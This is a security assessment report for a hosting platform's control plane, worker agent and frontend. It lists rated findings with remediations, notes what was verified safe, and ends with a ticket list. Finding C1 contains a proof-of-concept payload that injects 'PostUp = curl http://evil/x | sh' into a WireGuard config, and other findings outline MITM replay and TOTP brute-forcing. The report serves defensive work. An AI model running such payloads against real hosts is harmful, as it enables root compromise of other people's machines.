# Bunk-Hosting (bunk-fleet) — Security Assessment

**Engagement:** authorized assessment of the owner's own platform. **Commit:** `335bb9f` (+ one fix applied during the assessment, see H1).
**Methodology:** (1) static code review of all three in-scope repos — control plane (Elixir), worker agent (Go), frontend (Next.js); (2) dependency/supply-chain scan (`npm audit`, semgrep `p/security-audit,p/secrets,p/owasp-top-ten`); (3) authorized, **non-destructive** dynamic testing (DAST) against production `app.bunkhosting.nl` with a test account — auth, BOLA/IDOR, privilege-escalation, role-injection, rate-limiting, error-handling, header review.

**Scope reality note:** the in-scope targets in the brief were placeholders (`<STAGING_URL>`, `<REPO_PATH_*>`); there is **no staging environment** in this infrastructure, so per your authorization the dynamic phase ran read-only against production. Several threat-model items in the brief **do not exist in this system** and are marked N/A (Mollie webhooks, OTP email-whitelist, refresh-token rotation) — see the end.

---

## Executive summary

The platform's **core multi-tenant authorization is solid**: VPS/billing objects are owner-scoped (a cross-tenant VPS read returns 404, confirmed live), node/agent commands are node-scoped, enrollment is single-use and locked, the credit wallet is race-safe (advisory-locked), the admin API is closed-by-default, and registration rejects role injection. Security headers are strong (HSTS preload, frame-deny, CSP, permissions-policy). No SQL/command/atom injection was found.

The risk is concentrated in **the federation trust boundary** — the half of the platform where hardware you don't control runs other people's VMs. The most serious findings all live there:

- **CRITICAL:** a malicious/again control plane can achieve **root RCE on the worker** via an unvalidated WireGuard-overlay config interpolated into `wg-quick` (which runs as root).
- **HIGH:** the agent↔control-plane channel **isn't forced to TLS and has no mTLS** — on the operator's hostile LAN a MITM steals the agent token and injects commands (and delivers the overlay RCE); **destructive commands have no replay protection**; and **browser login/TOTP have no brute-force throttle** (confirmed live: 15 failed logins, zero `429`).
- **HIGH (introduced + FIXED this assessment):** the new self-service "become a host" feature let any customer self-promote to `:operator`, which unlocked the global operator dashboard (every tenant's VPS + nodes). Fixed by gating that dashboard to `:admin` only.

Counts: **1 Critical, 5 High, 11 Medium, ~10 Low/Info.** Prioritized ticket list at the end.

---

## CRITICAL

### C1 — Worker root RCE via WireGuard overlay config injection from the enroll response
**Component:** worker agent · `agent/cmd/bunk-agent/overlay.go:36-47,52-78`, reached from `main.go:61,96`; runs as root (`deploy/bunk-agent.service` has no `User=`).
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **9.6 (Critical)**
**Why it matters here:** `applyOverlay` writes a `wg-quick` config built with `fmt.Sprintf` from control-plane-supplied fields (`OverlayIP`, `HubPublicKey`, `Endpoint`) with **no validation**, then runs `wg-quick up bunk0` as root. `wg-quick` executes `PostUp`/`PreUp` directives via the shell. A newline in `OverlayIP` injects an arbitrary `PostUp = …` → arbitrary root command on every worker, persisted across restarts (re-read from `state.json`). Compounds with H-Agent-1 (plain-HTTP channel) into a network-level worker takeover.
**PoC (confirm-only):** enroll response with `"overlay_ip":"10.99.0.5/32\nPostUp = curl http://evil/x | sh"` → rendered into `[Interface]`, executed by `wg-quick up`.
**Remediation:** validate every overlay field before render — reject control chars; parse `OverlayIP` with `netip.ParsePrefix`, key with `base64`→32 bytes, `Endpoint` via `net.SplitHostPort`. Prefer configuring the interface via `wgctrl`/netlink (no shell, no config file). Do not run overlay bring-up as root in-process.

---

## HIGH

### H1 — Self-service `:operator` promotion unlocked the global fleet dashboard (cross-tenant disclosure) — **FIXED during assessment**
**Component:** control plane · `host_controller.ex:24-29`, `user_auth.ex:93-107` (`:ensure_staff`), `dashboard_live.ex` (unscoped `list_nodes/list_vpses`).
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7 (High)**
**Why it matters here:** `POST /api/v1/host/activate` (the new "bring your own hardware" onboarding) promotes any `:user`→`:operator` with no gate. The round-7 dashboard gate treated `role in [:operator, :admin]` as staff, and the dashboard loaders are **unscoped** — so a self-promoted customer could read every tenant's VPS (name, IP, provider VM id) and every node. Self-service onboarding accidentally became a fleet-wide data leak.
**Status:** **FIXED** — `:ensure_staff` now requires `role == :admin`. Operators keep their owner-scoped operator REST API (`RequireOperator`, which filters by `owner_email`). Currently the CP HTML routes are not publicly proxied (`control.bunkhosting.nl` does not resolve; only `/api/v1/*` is reachable via the tunnel), so this was latent rather than internet-live — but the gate logic was wrong and is now correct.
**Follow-up ticket:** if node-operators need a dashboard, build a separate one scoped to `list_nodes_for_owner/1`.

### H2 — No brute-force throttle on browser login/TOTP; the API throttle is XFF-spoofable — **confirmed live**
**Component:** control plane · `router.ex:43-53` (browser auth, no `RateLimit`), `plugs/rate_limit.ex:52-58` (trusts left-most `X-Forwarded-For`).
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **8.1 (High)**
**Why it matters here:** **DAST confirmed** — 15 rapid wrong passwords on `/api/v1/auth/login` all returned `401`, never `429`. The browser `UserSessionController.create`/`mfa_create` have no limit at all; combined with L-CP-1 (TOTP replay) an attacker with a stolen password brute-forces the 6-digit code unlimited → 2FA defeated. Even the JSON throttle is bypassable: `client_ip/1` takes the client-supplied first XFF hop, so a rotating fake hop = unlimited buckets.
**Remediation:** add a `RateLimit` plug to the browser auth pipeline (per-IP **and** per-account on MFA; lock after 5 bad codes); key the limiter on `CF-Connecting-IP` (Cloudflare-set, unforgeable) or the right-most XFF hop, not the left-most.

### H3 — Agent↔control-plane channel not forced to TLS; bearer-only, no mTLS
**Component:** worker agent · `internal/transport/transport.go:139-147`, `internal/config/config.go:219-221`, `deploy/agent.env.example` (`http://localhost:4000`).
**CVSS 3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.1 (High)**
**Why it matters here:** Go verifies certs for `https` (no `InsecureSkipVerify` — good), but **`https` is never required** and the shipped example is plain `http`. Auth is a single long-lived bearer token, no mutual TLS. On the operator's own (hostile) LAN a MITM reads the agent token + enroll token in cleartext, forges `provision`/`delete`/power commands, and delivers the C1 overlay RCE. A stolen token = full node impersonation.
**Remediation:** reject non-`https` `BUNK_CONTROL_PLANE_URL` at startup; add a pinned-CA option and ideally client-cert mTLS so a leaked bearer alone can't authenticate; change the example to `https://`.

### H4 — No replay/de-dup protection on destructive worker commands
**Component:** worker agent · `cmd/bunk-agent/main.go:227-373` (`Command.ID` logged, never used for idempotency).
**CVSS 3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H` = **7.1 (High)**
**Why it matters here:** with H3 (cleartext) a MITM can **replay a captured `delete{vm_id}`** later, when that VMID has been reassigned to another tenant → destroys the new occupant's VM. Commands are treated as authoritative with no processed-ID cache.
**Remediation:** fix the channel (H3) and keep a persisted, bounded processed-command-ID set so each `Command.ID` runs at most once; server-side, sign commands with a monotonic nonce/expiry.

### H5 — VPS console WebSocket sends no credential (broken-or-IDOR by design)
**Component:** frontend · `dashboard/vps/[id]/terminal/page.tsx:135-138` (+ control-plane console bridge).
**CVSS 3.1 (conditional):** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8** *if* the backend authorizes on path-id alone; otherwise the feature is simply non-functional today.
**Why it matters here:** the WS handshake to `…/ws/console/<id>/` carries no bearer (browsers can't set WS headers; the token is in localStorage, not a cookie). Either the console is dead (close 4001) or, if the backend trusts the VPS id / the `access_token=1` marker, **any user who learns a VPS UUID attaches to that VPS's root console** (IDOR to root shell). The client contract proves no identity, so secure backend behavior is impossible against it.
**Remediation:** mint a short-lived, single-use, **owner-checked** console ticket over authenticated HTTPS (`POST /vpses/:id/console-ticket`), connect with `?ticket=…`; backend validates ticket **and** ownership. Never authorize on the presence marker. (Backend console-ticket endpoint must be built too.)

---

## MEDIUM

### M1 — A worker can advertise unbounded capacity to monopolize/black-hole scheduling
**Component:** control plane · `heartbeat_controller.ex:11-18`, `fleet.ex:159-206`, `scheduler.ex:102-112`.
**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:H` = **7.6**
First heartbeat seeds `available_*` from node-reported totals with no cap; the scheduler picks max headroom-fraction. A hostile operator advertising `total_vcpu: 100000` wins **every** placement in its region → can **attract victim VMs onto hardware it controls** (read guest disk/RAM) or accept-and-never-provision (region DoS). **Remediation:** validate/clamp advertised totals per tier in `mark_online_changeset`; spread placement (cap per-node concurrent placements, proven-capacity grace period, randomize among top candidates). Treat heartbeats as untrusted. *(Agent-side counterpart L-Agent-1: unfixable on a hostile host — must be enforced server-side.)*

### M2 — Operator inflates metered payout by withholding the stop/delete result
**Component:** control plane · `provisioning.ex:443-473`, `billing.ex:133-201`.
**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5**
A VPS only leaves `:active` when the operator's own agent reports stop/delete done; metering bills all `:active` VPSes and pays the node owner. A malicious operator never POSTs the result → the VPS stays `:active`, accrues usage, and the operator keeps getting paid for a VM the customer stopped. **Remediation:** stop metering once a stop/delete command is unacked past a deadline; reconcile actual hypervisor state before paying; flag non-responsive nodes.

### M3 — REST API VPS creation never charges the wallet (billing bypass)
**Component:** control plane · `vps_controller.ex:38-52` → `provisioning.ex:73-92` (no `Credits.charge`); portal (`portal_live.ex:39-59`) does charge.
**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5**
`POST /api/v1/vpses` writes only a `Subscription` row; no job charges subscriptions to the wallet. So a customer creating VPSes via the API pays **nothing** (only the `max_vpses_per_owner=10` quota bounds it). **Remediation:** move the charge into `create_vps_for_owner/2` (atomic with the insert) so both surfaces are consistent, or implement the recurring subscription→wallet debit runner.

### M4 — Charge-then-provision is not atomic: a crash strands the debit
**Component:** control plane · `portal_live.ex:41-58`.
**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` = **4.3**
`Credits.charge` commits, then `create_vps_for_owner` runs with refund only on `{:error, _}`. If it **raises** (or the LiveView dies between calls), the debit is committed and never refunded. **Remediation:** debit inside the same Ecto transaction/Multi as the VPS insert; or `try/rescue` and refund on `rescue` too.

### M5 — Permissive LiveView `check_origin` (wildcard tunnel + plaintext origins)
**Component:** control plane · `config/runtime.exs:58` — allows `//*.trycloudflare.com`, `http://localhost:4000`, a hardcoded LAN IP.
**CVSS:** `AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N` = **3.7**
Any free Cloudflare quick-tunnel page passes the origin check for operator/customer sockets (CSRF token still required, so bounded). **Remediation:** in prod restrict to `["https://#{host}"]`; move tunnel/plaintext entries to dev/test config. *(Note: the stray quick-tunnel was already disabled during ops hardening.)*

### M6 — ESXi credentials in URL userinfo can leak to logs
**Component:** agent · `internal/provider/esxi/esxi.go:57-64`.
**CVSS:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **5.5**
`user:password@host` in the govmomi URL; govmomi errors/redirects render URLs → creds can reach `slog`/journald, readable by co-located tenants. **Remediation:** parse URL without userinfo and `SessionManager.Login(ctx, url.UserPassword(...))`; scrub userinfo before logging.

### M7 — ESXi cloud-init YAML built by unsanitized string concatenation
**Component:** agent · `internal/provider/esxi/esxi.go:389-446`.
**CVSS:** `AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:N` = **5.0**
`spec.Name`/SSH keys/IP/gw written raw into YAML; a newline injects arbitrary cloud-init `runcmd:`/`users:`. **Remediation:** marshal with `yaml.v3`; validate Name/IP/gw against strict charsets.

### M8 — Frontend CSP `script-src 'unsafe-inline'` neutralizes XSS defense for a localStorage bearer
**Component:** frontend · `next.config.mjs:52`; token in `lib/api.ts:34-42`.
**CVSS:** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N` = **5.6**
No XSS sink exists today (no `dangerouslySetInnerHTML`/`eval` — grep-clean), but if one is ever introduced, `'unsafe-inline'` + token-in-localStorage = one-line token exfiltration → account takeover. **Remediation:** nonce + `strict-dynamic` CSP from middleware (App Router supports it); drop `'unsafe-inline'` from `script-src` (keep on `style-src`). Highest-leverage frontend hardening.

### M9 — Secrets passable via CLI flags leak through the process table (agent)
**Component:** agent · `internal/config/config.go:134,140,152`.
**CVSS:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **5.0**
`-proxmox-token-secret`/`-esxi-password`/`-enroll-token` flags land in `/proc/<pid>/cmdline`, readable by any process on the shared host. **Remediation:** env/file only for secrets (`-…-file` path); drop the secret flags.

### M10 — Proxmox TLS verification disabled in the shipped example env
**Component:** agent · `deploy/agent.env.example` (`BUNK_PROXMOX_VERIFY_SSL=false`); code default is `true`.
**CVSS:** `AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` = **4.8**
Operators copy the example → verification off for the root-equivalent Proxmox token → MITM on the mgmt LAN captures it. **Remediation:** ship `=true`; document installing the PVE CA.

### M11 — Dependency CVEs (supply chain)
**Component:** frontend `package.json` (npm audit: 6 high, 2 moderate).
- `xlsx@0.18.5` — prototype pollution (CVE-2023-30533) + ReDoS (CVE-2024-22363), unpatched on npm. **Reachability low** (admin-only, write-only, never parses untrusted files). **Fix:** drop for a CSV writer, or repin to the vendor build `xlsx@https://cdn.sheetjs.com/xlsx-0.20.3/…`.
- `next@14.2.35` — npm flags Image-Optimizer DoS + RSC-deserialization DoS advisories. **Fix:** bump to the latest 14.2.x patch. *(Note: it IS already patched against the middleware-auth-bypass CVE-2025-29927.)*
- `form-data`, `glob` highs are transitive dev-tooling (eslint chain), not shipped to the client/server runtime — low priority.
- Unused `jose` dependency — remove (dead supply-chain surface).
- semgrep (Go): TLS `MinVersion` not set in `proxmox.go:94` (defaults to 1.2) and `x/crypto v0.31.0` is behind v0.35.0 (CVE-2025-22869, **not reachable** — only `curve25519` imported). Bump for hygiene; pin `MinVersion: tls.VersionTLS12`.

---

## LOW / INFO

- **L1 (CP) — TOTP replay window.** `accounts.ex:75` uses `NimbleTOTP.valid?/2` without `:since`/last-used tracking → a code is reusable for ~30 s across login + `/totp/disable`. Persist the last accepted timestep, reject `<=`. Compounds H2.
- **L2 (CP) — Console SSH disables host-key verification.** `console/key_cb.ex:10,13` + `silently_accept_hosts: true`. CP SSHes to `vps.ip_address` on an operator-controlled network with no host-key pinning → operator MITM of the console. Pin the expected host key per node/overlay IP.
- **L3 (CP) — Operator enroll-token TTL unbounded.** `operator_controller.ex:135-145` accepts any positive TTL. Cap ≤ 24 h.
- **L4 (CP) — No server-side HSTS/`force_ssl`.** Relies on Cloudflare. Add `force_ssl: [hsts: true]` for defense-in-depth (edge already sends HSTS — confirmed in DAST).
- **L5 (frontend) — Admin audit-log export via `window.location.href` drops the bearer** → 401. Functional; fetch via axios + Blob download.
- **L6 (agent) — Long-lived agent token, no rotation/expiry binding.** Pair with mTLS/PoP (H3); support CP-driven rotation.
- **L7 (agent) — Missing VMSpec bounds.** `int32(spec.VCPU)` can overflow on ESXi; validate ranges.
- **Info — Node API `/v1/*` is not publicly reachable** (DAST: 404 — the Next rewrite only proxies `/api/v1/*`). **Security-positive** (smaller attack surface for the worth-boundary findings above), **but** it means the worker-onboarding install one-liner the dashboard generates (`…app.bunkhosting.nl/v1/enroll`) will **404 for external operators** — the federation feature can't actually onboard a real external host until the node API is exposed (e.g. a `control.bunkhosting.nl` tunnel). Functional gap to resolve alongside the H3/C1 hardening before exposing it.
- **Info — login honeypot** (`login/page.tsx`) ships fake credentials + a prompt-injection canary to every visitor. Recognized as deliberate deception and ignored; consider that shipping bait to all users is itself a (minor) questionable practice.

---

## Verified SAFE / not applicable (assurance)

Confirmed by code review **and** live DAST where noted:
- **Multi-tenant object authz (BOLA/IDOR) is correct.** `get_vps_for_owner`/`list_vpses_for_owner` filter by `owner_id`; create stamps owner from session and `Map.drop`s body owner keys. **DAST:** another tenant's active VPS → `404 not_found`; list returns only own; power/stop on a non-owned id → 404.
- **Node command ACK/fetch/result are node-scoped** (`node_id` filter + `Repo.get_by(id, node_id)`); a node can't touch another node's commands.
- **Enrollment is single-use + `SELECT … FOR UPDATE` locked**; 256-bit tokens, SHA-256 stored.
- **Wallet integrity holds** — `Credits.charge` per-user `pg_advisory_xact_lock` + in-tx balance check (no negative/overspend); top-up confirm row-locked + status-checked (no double-credit). *(Confirms the round-7 wallet-lock fix.)*
- **No SQL/command/atom injection** — parameterized fragments; user atoms via whitelisted `String.to_existing_atom` with rescue.
- **Admin API closed-by-default** (`AdminAuth` denies on empty token, `secure_compare`); token from env.
- **Registration rejects role injection** — DAST: register with `"role":"admin"` → user created as `:user`.
- **Privilege escalation denied** — DAST: fresh user → `/operator/*` and `/admin/v1/*` all `403`.
- **No error/stack leakage** — DAST: bad UUID → `404 not_found`, malformed JSON → `400`, no 500 stacktraces.
- **Strong security headers** — DAST: HSTS w/ preload, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, CSP, `Referrer-Policy`, `Permissions-Policy`, `frame-ancestors 'none'`.
- **No open redirect** (`safeNext` rejects `//`, `\`, non-`/`); **no SSRF** in the Next rewrite (server-env target).
- **LiveDashboard dev-only**; **Next 14.2.35** patched vs CVE-2025-29927.
- **N/A threat-model items:** no Mollie/payment-webhook integration (webhook forgery/replay N/A), no OTP email-whitelist (TOTP is used), no refresh-token rotation (60-day hashed session tokens + `logout_all`).

---

## Prioritized fix list (tickets)

| # | Sev | Ticket | Component | Effort |
|---|-----|--------|-----------|--------|
| 1 | Crit | Validate/parse WireGuard overlay fields; configure via wgctrl, not `wg-quick` shell; don't bring up as root | agent | M |
| 2 | High | **DONE** — gate fleet dashboard to `:admin` only | control plane | ✅ |
| 3 | High | Enforce `https` for the CP URL + add pinned-CA/mTLS to the agent channel | agent + CP | M |
| 4 | High | Rate-limit browser login/TOTP (per-IP + per-account); key on `CF-Connecting-IP` | control plane | S |
| 5 | High | Replay protection: persisted processed-command-ID cache + signed commands w/ nonce | agent + CP | M |
| 6 | High | Console auth: owner-checked single-use ticket over HTTPS + backend WS endpoint | frontend + CP | M |
| 7 | Med | Clamp advertised node capacity + spread scheduling (anti-monopolize) | control plane | M |
| 8 | Med | Charge the wallet on `POST /api/v1/vpses` (atomic) / subscription-billing runner | control plane | M |
| 9 | Med | Stop metering unacked stop/delete past deadline; reconcile before payout | control plane | M |
| 10 | Med | Atomic charge+provision (debit in the Multi) | control plane | S |
| 11 | Med | Lock down `check_origin` to the canonical https host in prod | control plane | S |
| 12 | Med | ESXi: creds out of URL; YAML via `yaml.v3`; secrets env/file-only | agent | S |
| 13 | Med | Nonce CSP (drop `script-src 'unsafe-inline'`); bump next; drop xlsx+jose | frontend | M |
| 14 | Med | Ship `BUNK_PROXMOX_VERIFY_SSL=true`; pin TLS MinVersion | agent | S |
| 15 | Low | TOTP replay tracking; console host-key pinning; enroll-TTL cap; `force_ssl` | CP | S |

**Top of the list before exposing the node API publicly:** #1 + #3 + #5 (the worker trust boundary) must land first — today the node API isn't internet-reachable, which is the only thing keeping C1/H3/H4 from being live.
